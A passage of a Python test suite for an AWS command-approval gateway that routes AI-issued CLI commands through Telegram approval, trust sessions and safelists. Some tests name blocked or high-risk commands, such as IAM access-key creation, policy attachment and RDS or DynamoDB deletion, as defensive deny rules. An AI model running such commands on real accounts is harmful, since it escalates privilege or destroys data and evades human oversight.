        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'pending_approval'
        assert 'request_id' in content
    
    @patch('telegram.send_telegram_message')
    def test_add_account_empty_role_arn(self, mock_telegram, app_module):
        """新增帳號空 Role ARN（允許）"""
        result = app_module.mcp_tool_add_account('test-1', {
            'account_id': '333333333333',
            'name': 'No Role Account',
            'role_arn': '',
            'async': True
        })
        
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'pending_approval'


# ============================================================================
# REST API 完整測試
# ============================================================================

class TestRESTAPIFull:
    """REST API 完整測試"""
    
    @patch('telegram.send_telegram_message')
    def test_rest_api_approval_wait(self, mock_telegram, app_module):
        """REST API 等待審批（短超時）"""
        event = {
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'command': 'aws ec2 start-instances --instance-ids i-123',
                'reason': 'test',
                'wait': True,
                'timeout': 1  # 1 秒超時
            })
        }
        
        result = app_module.handle_clawdbot_request(event)
        # 應該返回 pending（因為超時太短）
        assert result['statusCode'] in [200, 202]


# ============================================================================
# 更多 App 覆蓋測試
# ============================================================================

class TestAppModuleMore:
    """更多 App 模組測試"""
    
    def test_mcp_execute_with_paging(self, app_module):
        """執行命令並測試分頁"""
        # Mock 返回長輸出
        long_output = 'x' * 5000
        with patch.object(app_module, 'execute_command', return_value=long_output):
            event = {
                'rawPath': '/mcp',
                'headers': {'x-approval-secret': 'test-secret'},
                'body': json.dumps({
                    'jsonrpc': '2.0',
                    'id': 'test',
                    'method': 'tools/call',
                    'params': {
                        'name': 'bouncer_execute',
                        'arguments': {
                            'command': 'aws logs get-log-events --log-group-name test',
                            'trust_scope': 'test-session',
                        }
                    }
                }),
                'requestContext': {'http': {'method': 'POST'}}
            }
            
            result = app_module.lambda_handler(event, None)
            body = json.loads(result['body'])
            content = json.loads(body['result']['content'][0]['text'])
            
            assert content['status'] == 'auto_approved'
            # 檢查是否有分頁
            if content.get('paged'):
                assert content['total_pages'] >= 2
    
    def test_mcp_get_page(self, app_module):
        """取得分頁"""
        # 先建立分頁
        app_module.table.put_item(Item={
            'request_id': 'get-page-test:page:2',
            'content': 'Page 2 data',
            'page': 2,
            'total_pages': 3,
            'original_request': 'get-page-test'
        })
        
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test',
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_get_page',
                    'arguments': {
                        'page_id': 'get-page-test:page:2'
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        
        assert content['page'] == 2
        assert content['result'] == 'Page 2 data'
    
    def test_mcp_list_accounts_with_mock(self, app_module):
        """列出帳號（有帳號）"""
        with patch.object(app_module, 'list_accounts', return_value=[
            {'account_id': '444444444444', 'name': 'Test Account', 'enabled': True}
        ]):
            event = {
                'rawPath': '/mcp',
                'headers': {'x-approval-secret': 'test-secret'},
                'body': json.dumps({
                    'jsonrpc': '2.0',
                    'id': 'test',
                    'method': 'tools/call',
                    'params': {
                        'name': 'bouncer_list_accounts',
                        'arguments': {}
                    }
                }),
                'requestContext': {'http': {'method': 'POST'}}
            }
            
            result = app_module.lambda_handler(event, None)
            body = json.loads(result['body'])
            content = json.loads(body['result']['content'][0]['text'])
            
            assert 'accounts' in content


# ============================================================================
# Deployer 更多測試
# ============================================================================

class TestDeployerMore:
    """Deployer 更多測試"""
    
    @pytest.fixture
    def deployer_more_setup(self, mock_dynamodb):
        """Deployer 設置"""
        mock_dynamodb.create_table(
            TableName='bouncer-projects',
            KeySchema=[{'AttributeName': 'project_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[{'AttributeName': 'project_id', 'AttributeType': 'S'}],
            BillingMode='PAY_PER_REQUEST'
        )
        
        mock_dynamodb.create_table(
            TableName='bouncer-deploy-history',
            KeySchema=[{'AttributeName': 'deploy_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[
                {'AttributeName': 'deploy_id', 'AttributeType': 'S'},
                {'AttributeName': 'project_id', 'AttributeType': 'S'},
                {'AttributeName': 'started_at', 'AttributeType': 'N'}
            ],
            GlobalSecondaryIndexes=[{
                'IndexName': 'project-time-index',
                'KeySchema': [
                    {'AttributeName': 'project_id', 'KeyType': 'HASH'},
                    {'AttributeName': 'started_at', 'KeyType': 'RANGE'}
                ],
                'Projection': {'ProjectionType': 'ALL'}
            }],
            BillingMode='PAY_PER_REQUEST'
        )
        
        mock_dynamodb.create_table(
            TableName='bouncer-deploy-locks',
            KeySchema=[{'AttributeName': 'project_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[{'AttributeName': 'project_id', 'AttributeType': 'S'}],
            BillingMode='PAY_PER_REQUEST'
        )
        
        return mock_dynamodb
    
    def test_start_deploy_success(self, deployer_more_setup):
        """成功啟動部署"""
        import sys
        if 'deployer' in sys.modules:
            del sys.modules['deployer']
        if 'src.deployer' in sys.modules:
            del sys.modules['src.deployer']
        
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        import deployer
        
        deployer.projects_table = deployer_more_setup.Table('bouncer-projects')
        deployer.history_table = deployer_more_setup.Table('bouncer-deploy-history')
        deployer.locks_table = deployer_more_setup.Table('bouncer-deploy-locks')
        
        # 新增專案
        deployer.projects_table.put_item(Item={
            'project_id': 'deploy-test',
            'name': 'Deploy Test',
            'git_repo': 'test-repo',
            'stack_name': 'test-stack',
            'enabled': True
        })
        
        # Mock Step Functions
        with patch.object(deployer, 'sfn_client') as mock_sfn:
            mock_sfn.start_execution.return_value = {
                'executionArn': 'arn:aws:states:...'
            }
            
            result = deployer.start_deploy('deploy-test', 'main', 'test-user', 'test reason')
            
            # 如果沒有 STATE_MACHINE_ARN 會失敗，但這測試了大部分路徑
            assert 'status' in result or 'error' in result
        
        sys.path.pop(0)
    
    def test_mcp_deploy_history(self, app_module):
        """部署歷史 MCP"""
        with patch('deployer.get_deploy_history', return_value=[
            {'deploy_id': 'deploy-1', 'status': 'SUCCESS'},
            {'deploy_id': 'deploy-2', 'status': 'FAILED'}
        ]):
            event = {
                'rawPath': '/mcp',
                'headers': {'x-approval-secret': 'test-secret'},
                'body': json.dumps({
                    'jsonrpc': '2.0',
                    'id': 'test',
                    'method': 'tools/call',
                    'params': {
                        'name': 'bouncer_deploy_history',
                        'arguments': {
                            'project': 'test-project'
                        }
                    }
                }),
                'requestContext': {'http': {'method': 'POST'}}
            }
            
            result = app_module.lambda_handler(event, None)
            body = json.loads(result['body'])
            content = json.loads(body['result']['content'][0]['text'])
            
            assert 'history' in content
    
    def test_mcp_deploy_cancel(self, app_module):
        """取消部署 MCP"""
        with patch('deployer.cancel_deploy', return_value={'status': 'cancelled', 'deploy_id': 'test'}):
            event = {
                'rawPath': '/mcp',
                'headers': {'x-approval-secret': 'test-secret'},
                'body': json.dumps({
                    'jsonrpc': '2.0',
                    'id': 'test',
                    'method': 'tools/call',
                    'params': {
                        'name': 'bouncer_deploy_cancel',
                        'arguments': {
                            'deploy_id': 'test-deploy'
                        }
                    }
                }),
                'requestContext': {'http': {'method': 'POST'}}
            }
            
            result = app_module.lambda_handler(event, None)
            body = json.loads(result['body'])
            content = json.loads(body['result']['content'][0]['text'])
            
            assert content['status'] == 'cancelled'


# ============================================================================
# Paging 更多測試
# ============================================================================

class TestPagingMore:
    """Paging 更多測試"""
    
    def test_send_remaining_pages(self, app_module):
        """發送剩餘分頁"""
        # 建立分頁資料
        app_module.table.put_item(Item={
            'request_id': 'send-pages-test:page:2',
            'content': 'Page 2',
            'page': 2,
            'total_pages': 2
        })
        
        with patch('paging.send_telegram_message') as mock_send:
            from paging import send_remaining_pages
            send_remaining_pages('send-pages-test', 2)
            # 應該嘗試發送（即使失敗）
    
    def test_send_remaining_pages_single(self, app_module):
        """單頁不需要發送"""
        with patch('paging.send_telegram_message') as mock_send:
            from paging import send_remaining_pages
            send_remaining_pages('single-page', 1)
            mock_send.assert_not_called()


# ============================================================================
# Lambda Handler 更多路由測試
# ============================================================================

class TestLambdaHandlerMore:
    """Lambda Handler 更多測試"""
    
    def test_handler_status_path(self, app_module):
        """/status 路徑"""
        # 先建立一個請求
        app_module.table.put_item(Item={
            'request_id': 'status-path-test',
            'command': 'aws s3 ls',
            'status': 'approved'
        })
        
        event = {
            'rawPath': '/status/status-path-test',
            'headers': {'x-approval-secret': 'test-secret'},
            'requestContext': {'http': {'method': 'GET'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        body = json.loads(result['body'])
        assert body['status'] == 'approved'
    
    def test_handler_post_to_root(self, app_module):
        """POST 到 root（REST API）"""
        with patch.object(app_module, 'execute_command', return_value='{"ok": true}'):
            event = {
                'rawPath': '/',
                'path': '/',
                'headers': {'x-approval-secret': 'test-secret'},
                'body': json.dumps({
                    'command': 'aws s3 ls'
                }),
                'requestContext': {'http': {'method': 'POST'}}
            }
            
            result = app_module.lambda_handler(event, None)
            assert result['statusCode'] == 200


# ============================================================================
# 更多覆蓋率測試 - 80% 衝刺
# ============================================================================

class TestCoverage80Sprint:
    """80% 覆蓋率衝刺測試"""
    
    def test_callback_invalid_data(self, app_module):
        """callback 無效 data"""
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb123',
                    'from': {'id': 999999999},
                    'data': 'invalid-no-colon',  # 沒有冒號
                    'message': {'message_id': 999}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 400
    
    @patch('mcp_tools.send_telegram_message')
    def test_mcp_execute_with_configured_account(self, mock_telegram, app_module):
        """執行命令使用配置的帳號"""
        import mcp_execute
        import mcp_tools
        with patch.object(mcp_execute, 'get_account', return_value={
            'account_id': '555555555555',
            'name': 'Configured Account',
            'enabled': True,
            'role_arn': 'arn:aws:iam::555555555555:role/TestRole'
        }), patch.object(mcp_execute, 'execute_command', return_value='{"result": "ok"}'):
            event = {
                'rawPath': '/mcp',
                'headers': {'x-approval-secret': 'test-secret'},
                'body': json.dumps({
                    'jsonrpc': '2.0',
                    'id': 'test',
                    'method': 'tools/call',
                    'params': {
                        'name': 'bouncer_execute',
                        'arguments': {
                            'command': 'aws s3 ls',
                            'trust_scope': 'test-session',
                            'account': '555555555555'
                        }
                    }
                }),
                'requestContext': {'http': {'method': 'POST'}}
            }
            
            result = app_module.lambda_handler(event, None)
            body = json.loads(result['body'])
            content = json.loads(body['result']['content'][0]['text'])
            
            assert content['status'] == 'auto_approved'
            assert content['account'] == '555555555555'
    
    @patch('telegram.send_telegram_message')
    def test_send_approval_request_with_assume_role(self, mock_telegram, app_module):
        """發送審批請求帶 assume_role"""
        app_module.send_approval_request(
            'test-req-789',
            'aws ec2 start-instances',
            'Test',
            assume_role='arn:aws:iam::123456789012:role/TestRole'
        )
        mock_telegram.assert_called()
    
    def test_decimal_to_native_nested(self, app_module):
        """Decimal 轉換 - 巢狀結構"""
        from decimal import Decimal
        data = {
            'list': [Decimal('1'), {'nested': Decimal('2.5')}],
            'value': Decimal('100')
        }
        result = app_module.decimal_to_native(data)
        assert result['list'][0] == 1
        assert result['list'][1]['nested'] == 2.5
        assert result['value'] == 100
    
    def test_mcp_tools_list_all_tools(self, app_module):
        """工具列表包含所有工具"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test',
                'method': 'tools/list'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        tools = body['result']['tools']
        tool_names = [t['name'] for t in tools]
        
        # 驗證所有主要工具都存在
        expected_tools = [
            'bouncer_execute',
            'bouncer_status',
            'bouncer_list_safelist',
            'bouncer_list_accounts',
            'bouncer_add_account',
            'bouncer_remove_account',
            'bouncer_upload',
            'bouncer_deploy',
            'bouncer_deploy_status',
            'bouncer_trust_status',
            'bouncer_trust_revoke',
            'bouncer_get_page',
            'bouncer_list_pending'
        ]
        
        for tool in expected_tools:
            assert tool in tool_names, f"Missing tool: {tool}"
    
    @patch('app.update_message')
    @patch('app.answer_callback')
    @patch('callbacks.execute_command')
    def test_callback_approve_with_paged_result(self, mock_execute, mock_answer, mock_update, app_module):
        """批准命令並返回分頁結果"""
        # 返回長輸出
        mock_execute.return_value = 'x' * 5000  # 長輸出
        
        request_id = 'paged-approve-test'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws logs get-log-events',
            'status': 'pending_approval',
            'source': 'test',
            'reason': 'test',
            'account_id': '111111111111',
            'account_name': 'Default',
            'ttl': int(time.time()) + 300
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb123',
                    'from': {'id': 999999999},
                    'data': f'approve:{request_id}',
                    'message': {'message_id': 999}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
    
    def test_escape_markdown_all_chars(self, app_module):
        """Markdown 跳脫所有特殊字元（zero-width space）"""
        from telegram import escape_markdown
        zwsp = '\u200b'
        text = '*_`['
        escaped = escape_markdown(text)
        assert f'*{zwsp}' in escaped
        assert f'_{zwsp}' in escaped
        assert f'`{zwsp}' in escaped
        assert f'[{zwsp}' in escaped
    
    @patch('telegram.send_telegram_message')
    def test_mcp_upload_with_legacy_bucket(self, mock_telegram, app_module):
        """上傳使用舊版 bucket/key 參數"""
        import base64
        content = base64.b64encode(b'test').decode()
        
        result = app_module.mcp_tool_upload('test-1', {
            'bucket': 'legacy-bucket',
            'key': 'legacy/key.txt',
            'content': content,
            'reason': 'legacy test'
        })
        
        body = json.loads(result['body'])
        content_data = json.loads(body['result']['content'][0]['text'])
        assert content_data['status'] == 'pending_approval'
    
    def test_handle_mcp_tool_call_all_tools(self, app_module):
        """測試所有 MCP tool 路由"""
        # bouncer_list_safelist
        result = app_module.handle_mcp_tool_call('test-1', 'bouncer_list_safelist', {})
        body = json.loads(result['body'])
        assert 'result' in body
        
        # bouncer_trust_status
        result = app_module.handle_mcp_tool_call('test-1', 'bouncer_trust_status', {})
        body = json.loads(result['body'])
        assert 'result' in body
    
    def test_get_header_various_cases(self, app_module):
        """get_header 各種大小寫"""
        headers = {
            'X-Custom-Header': 'value1',
            'content-type': 'application/json'
        }
        
        assert app_module.get_header(headers, 'x-custom-header') == 'value1'
        assert app_module.get_header(headers, 'X-CUSTOM-HEADER') == 'value1'
        assert app_module.get_header(headers, 'Content-Type') == 'application/json'
        assert app_module.get_header(headers, 'Missing') is None


# ============================================================================
# Commands 模組 - 更多測試
# ============================================================================

class TestCommandsMore:
    """Commands 更多測試"""
    
    def test_is_auto_approve_logs(self, app_module):
        """CloudWatch Logs 讀取自動批准"""
        from commands import is_auto_approve
        assert is_auto_approve('aws logs filter-log-events --log-group-name test') is True
        assert is_auto_approve('aws logs get-log-events --log-group-name test') is True
        assert is_auto_approve('aws logs describe-log-groups') is True
    
    def test_is_auto_approve_ecr(self, app_module):
        """ECR 讀取自動批准"""
        from commands import is_auto_approve
        assert is_auto_approve('aws ecr describe-repositories') is True
        assert is_auto_approve('aws ecr list-images --repository-name test') is True
    
    def test_is_blocked_iam_put_policy(self, app_module):
        """IAM put policy 應該被封鎖"""
        from commands import is_blocked
        assert is_blocked('aws iam put-user-policy --user-name test') is True
        assert is_blocked('aws iam put-role-policy --role-name test') is True
    
    def test_is_dangerous_logs_delete(self, app_module):
        """logs delete 應該是高危"""
        from commands import is_dangerous
        assert is_dangerous('aws logs delete-log-group --log-group-name test') is True


# ============================================================================
# 80% 覆蓋率衝刺 - 第二波
# ============================================================================

class TestDeployerMoreExtended:
    """Deployer 更多測試"""
    
    def test_mcp_deploy_missing_project(self, app_module):
        """部署缺少 project 參數 (via MCP handler)"""
        result = app_module.handle_mcp_tool_call('test-1', 'bouncer_deploy', {})
        body = json.loads(result['body'])
        assert 'error' in body
    
    def test_mcp_deploy_missing_reason(self, app_module):
        """部署缺少 reason 參數"""
        result = app_module.handle_mcp_tool_call('test-1', 'bouncer_deploy', {'project': 'bouncer'})
        body = json.loads(result['body'])
        assert 'error' in body
    
    def test_mcp_deploy_project_not_found(self, app_module):
        """部署不存在的專案"""
        result = app_module.handle_mcp_tool_call('test-1', 'bouncer_deploy', {
            'project': 'nonexistent-project-xyz',
            'reason': 'test'
        })
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'error'
        assert '不存在' in content['error']
    
    def test_mcp_project_list(self, app_module):
        """列出可部署專案"""
        result = app_module.handle_mcp_tool_call('test-1', 'bouncer_project_list', {})
        body = json.loads(result['body'])
        assert 'result' in body


class TestRateLimitMore:
    """Rate Limit 更多測試"""
    
    def test_check_rate_limit_new_source(self, app_module):
        """新來源的 rate limit 檢查"""
        from rate_limit import check_rate_limit, RateLimitExceeded, PendingLimitExceeded
        # 不應該拋出異常
        try:
            check_rate_limit('brand-new-source-' + str(time.time()))
        except (RateLimitExceeded, PendingLimitExceeded):
            pytest.fail("Should not raise limit exception for new source")
    
    def test_check_rate_limit_repeated(self, app_module):
        """重複來源的 rate limit 檢查"""
        from rate_limit import check_rate_limit
        source = 'repeat-source-' + str(time.time())
        # 多次呼叫不應該拋出異常（在限制內）
        check_rate_limit(source)
        check_rate_limit(source)


class TestTelegramMore:
    """Telegram 更多測試"""
    
    @patch('urllib.request.urlopen')
    def test_send_telegram_message_error(self, mock_urlopen, app_module):
        """發送失敗"""
        from telegram import send_telegram_message
        mock_urlopen.side_effect = Exception('Network error')
        # 不應該拋出異常
        send_telegram_message('test message')
    
    @patch('urllib.request.urlopen')
    def test_answer_callback_error(self, mock_urlopen, app_module):
        """callback 回答失敗"""
        from telegram import answer_callback
        mock_urlopen.side_effect = Exception('Network error')
        answer_callback('callback-id', 'text')


class TestAccountsMore:
    """Accounts 更多測試"""
    
    def test_validate_account_id_too_short(self, app_module):
        """帳號 ID 太短"""
        from app import validate_account_id
        valid, error = validate_account_id('123')
        assert valid is False
        assert 'must be 12 digits' in error.lower() or '12' in error
    
    def test_validate_account_id_non_numeric(self, app_module):
        """帳號 ID 非數字"""
        from app import validate_account_id
        valid, error = validate_account_id('12345678901a')
        assert valid is False


class TestCallbackHandlers:
    """Callback Handlers 測試"""
    
    @patch('app.execute_command')
    @patch('app.update_message')
    @patch('app.answer_callback')
    def test_callback_approve(self, mock_answer, mock_update, mock_exec, app_module):
        """批准請求"""
        mock_exec.return_value = '{"result": "ok"}'
        
        request_id = 'approve-test-' + str(int(time.time()))
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws s3 ls',
            'status': 'pending_approval',
            'source': 'test',
            'reason': 'test',
            'account_id': '111111111111',
            'account_name': 'Default',
            'created_at': int(time.time()),
            'ttl': int(time.time()) + 300
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb-approve',
                    'from': {'id': 999999999},
                    'data': f'approve:{request_id}',
                    'message': {'message_id': 1000}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        # 驗證狀態更新
        item = app_module.table.get_item(Key={'request_id': request_id}).get('Item')
        assert item['status'] in ['approved', 'executed']
    
    @patch('app.update_message')
    @patch('app.answer_callback')
    def test_callback_reject(self, mock_answer, mock_update, app_module):
        """拒絕請求"""
        request_id = 'reject-test-' + str(int(time.time()))
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws ec2 stop-instances',
            'status': 'pending_approval',
            'source': 'test',
            'reason': 'test',
            'account_id': '111111111111',
            'account_name': 'Default',
            'created_at': int(time.time()),
            'ttl': int(time.time()) + 300
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb-reject',
                    'from': {'id': 999999999},
                    'data': f'deny:{request_id}',  # 正確的 action 是 deny
                    'message': {'message_id': 1001}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        # 驗證狀態更新
        item = app_module.table.get_item(Key={'request_id': request_id}).get('Item')
        assert item['status'] == 'denied'
    
    @patch('app.update_message')
    @patch('app.answer_callback')
    def test_callback_expired_request(self, mock_answer, mock_update, app_module):
        """已過期的請求"""
        request_id = 'expired-test-' + str(int(time.time()))
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws ec2 stop-instances',
            'status': 'expired',
            'source': 'test',
            'reason': 'test',
            'created_at': int(time.time()) - 1000,
            'ttl': int(time.time()) - 100
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb-expired',
                    'from': {'id': 999999999},
                    'data': f'approve:{request_id}',
                    'message': {'message_id': 1002}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200


class TestMCPRemoveAccount:
    """MCP Remove Account 測試"""
    
    @patch('telegram.send_telegram_message')
    def test_remove_default_account_blocked(self, mock_telegram, app_module):
        """不能移除預設帳號"""
        import mcp_tools
        import mcp_admin
        original = mcp_admin.DEFAULT_ACCOUNT_ID
        try:
            mcp_admin.DEFAULT_ACCOUNT_ID = '111111111111'
            result = app_module.mcp_tool_remove_account('test-1', {
                'account_id': '111111111111'
            })
            body = json.loads(result['body'])
            content = json.loads(body['result']['content'][0]['text'])
            assert content['status'] == 'error'
            assert '預設帳號' in content['error']
        finally:
            mcp_admin.DEFAULT_ACCOUNT_ID = original
    
    @patch('telegram.send_telegram_message')
    def test_remove_nonexistent_account(self, mock_telegram, app_module):
        """移除不存在的帳號"""
        result = app_module.mcp_tool_remove_account('test-1', {
            'account_id': '999999999999'
        })
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'error'
        assert '不存在' in content['error']


class TestMCPListPending:
    """MCP List Pending 測試"""
    
    def test_list_pending_empty(self, app_module):
        """列出空的 pending"""
        result = app_module.mcp_tool_list_pending('test-1', {})
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['pending_count'] == 0
    
    def test_list_pending_with_source_filter(self, app_module):
        """列出特定 source 的 pending"""
        # 插入 pending 項目
        source = 'filter-test-' + str(int(time.time()))
        app_module.table.put_item(Item={
            'request_id': 'pending-filter-001',
            'command': 'aws s3 cp',
            'status': 'pending',
            'source': source,
            'account_id': '111111111111',
            'reason': 'test reason',
            'created_at': int(time.time()),
            'ttl': int(time.time()) + 300
        })
        
        result = app_module.mcp_tool_list_pending('test-1', {'source': source})
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['pending_count'] >= 1


class TestPagingMoreExtended:
    """Paging 更多測試"""
    
    def test_get_page_not_found(self, app_module):
        """MCP get_page 找不到"""
        result = app_module.mcp_tool_get_page('test-1', {'page_id': 'nonexistent-page-xyz'})
        body = json.loads(result['body'])
        # 頁面不存在應該返回 isError 或錯誤訊息
        content = json.loads(body['result']['content'][0]['text'])
        assert 'error' in content or body['result'].get('isError') is True


class TestWebhookMessage:
    """Webhook 訊息測試"""
    
    def test_webhook_text_message(self, app_module):
        """收到文字訊息"""
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'message': {
                    'message_id': 123,
                    'from': {'id': 999999999},
                    'chat': {'id': 999999999},
                    'text': 'hello'
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
    
    def test_webhook_empty_body(self, app_module):
        """空的 webhook body"""
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': '{}',
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200


# ============================================================================
# 80% 覆蓋率衝刺 - 補充測試
# ============================================================================

class TestCommandsExtra:
    """Commands 額外測試"""
    
    def test_is_blocked_various(self, app_module):
        """各種 blocked 命令"""
        from commands import is_blocked
        # IAM 危險操作
        assert is_blocked('aws iam create-access-key') is True
        assert is_blocked('aws iam delete-access-key') is True
        assert is_blocked('aws iam attach-role-policy') is True
        # 不危險的
        assert is_blocked('aws s3 ls') is False
    
    def test_is_auto_approve_various(self, app_module):
        """各種自動批准命令"""
        from commands import is_auto_approve
        # 讀取操作
        assert is_auto_approve('aws ec2 describe-instances') is True
        assert is_auto_approve('aws s3 ls') is True
        assert is_auto_approve('aws lambda list-functions') is True
        # 寫入操作
        assert is_auto_approve('aws s3 cp file.txt s3://bucket/') is False
    
    def test_is_dangerous_various(self, app_module):
        """各種高危命令"""
        from commands import is_dangerous
        # 刪除操作
        assert is_dangerous('aws rds delete-db-instance') is True
        assert is_dangerous('aws dynamodb delete-table') is True
        # 非刪除
        assert is_dangerous('aws s3 ls') is False


class TestTrustMore:
    """Trust 更多測試"""
    
    def test_mcp_trust_status_empty(self, app_module):
        """無信任時段"""
        result = app_module.mcp_tool_trust_status('test-1', {})
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['active_sessions'] == 0
    
    def test_mcp_trust_revoke_missing_id(self, app_module):
        """撤銷缺少 ID"""
        result = app_module.mcp_tool_trust_revoke('test-1', {})
        body = json.loads(result['body'])
        assert 'error' in body


class TestMCPStatus:
    """MCP Status 測試"""
    
    def test_status_request_found(self, app_module):
        """查詢存在的請求狀態"""
        request_id = 'status-test-' + str(int(time.time()))
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws s3 ls',
            'status': 'approved',
            'source': 'test',
            'created_at': int(time.time())
        })
        
        result = app_module.mcp_tool_status('test-1', {'request_id': request_id})
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'approved'


class TestMCPSafelist:
    """MCP Safelist 測試"""
    
    def test_list_safelist_via_handler(self, app_module):
        """透過 handler 列出 safelist"""
        result = app_module.handle_mcp_tool_call('test-1', 'bouncer_list_safelist', {})
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert 'safelist_prefixes' in content
        assert isinstance(content['safelist_prefixes'], list)


class TestDeployerExtra:
    """Deployer 額外測試"""
    
    def test_deploy_cancel(self, app_module):
        """取消部署"""
        result = app_module.handle_mcp_tool_call('test-1', 'bouncer_deploy_cancel', {
            'deploy_id': 'nonexistent-deploy'
        })
        body = json.loads(result['body'])
        # 應該有結果（可能是找不到）
        assert 'result' in body or 'error' in body
    
    def test_deploy_history(self, app_module):
        """部署歷史"""
        result = app_module.handle_mcp_tool_call('test-1', 'bouncer_deploy_history', {
            'project': 'bouncer'
        })
        body = json.loads(result['body'])
        assert 'result' in body
    
    def test_deploy_status_missing_id(self, app_module):
        """部署狀態缺少 ID"""
        result = app_module.handle_mcp_tool_call('test-1', 'bouncer_deploy_status', {})
        body = json.loads(result['body'])
        assert 'error' in body


class TestCallbackTrust:
    """Callback Trust 測試"""
    
    @patch('app.execute_command')
    @patch('app.update_message')
    @patch('app.answer_callback')
    def test_callback_approve_with_trust(self, mock_answer, mock_update, mock_exec, app_module):
        """批准並建立信任"""
        mock_exec.return_value = '{"result": "ok"}'
        
        request_id = 'trust-test-' + str(int(time.time()))
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws s3 ls',
            'status': 'pending_approval',
            'source': 'test-trust-source',
            'reason': 'test',
            'account_id': '111111111111',
            'account_name': 'Default',
            'created_at': int(time.time()),
            'ttl': int(time.time()) + 300
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb-trust',
                    'from': {'id': 999999999},
                    'data': f'approve_trust:{request_id}',
                    'message': {'message_id': 2000}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200


class TestValidation:
    """驗證測試"""
    
    def test_validate_account_id_valid(self, app_module):
        """有效的帳號 ID"""
        valid, error = app_module.validate_account_id('123456789012')
        assert valid is True
        assert error is None
    
    def test_validate_account_id_empty(self, app_module):
        """空的帳號 ID"""
        valid, error = app_module.validate_account_id('')
        assert valid is False
    
    def test_validate_account_id_invalid_chars(self, app_module):
        """非數字的帳號 ID"""
        valid, error = app_module.validate_account_id('12345678901a')
        assert valid is False


class TestDecimalConversion:
    """Decimal 轉換測試"""
    
    def test_decimal_to_native_int(self, app_module):
        """整數 Decimal"""
        result = app_module.decimal_to_native(Decimal('100'))
        assert result == 100
        assert isinstance(result, int)
    
    def test_decimal_to_native_float(self, app_module):
        """浮點數 Decimal"""
        result = app_module.decimal_to_native(Decimal('3.14'))
        assert result == 3.14
        assert isinstance(result, float)
    
    def test_decimal_to_native_dict(self, app_module):
        """字典中的 Decimal"""
        data = {'count': Decimal('5'), 'rate': Decimal('0.5')}
        result = app_module.decimal_to_native(data)
        assert result['count'] == 5
        assert result['rate'] == 0.5


class TestMCPAddAccount:
    """MCP Add Account 測試"""
    
    @patch('telegram.send_telegram_message')
    def test_add_account_invalid_id(self, mock_telegram, app_module):
        """新增無效帳號 ID"""
        result = app_module.mcp_tool_add_account('test-1', {
            'account_id': 'invalid',
            'name': 'Test'
        })
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'error'
    
    @patch('telegram.send_telegram_message')
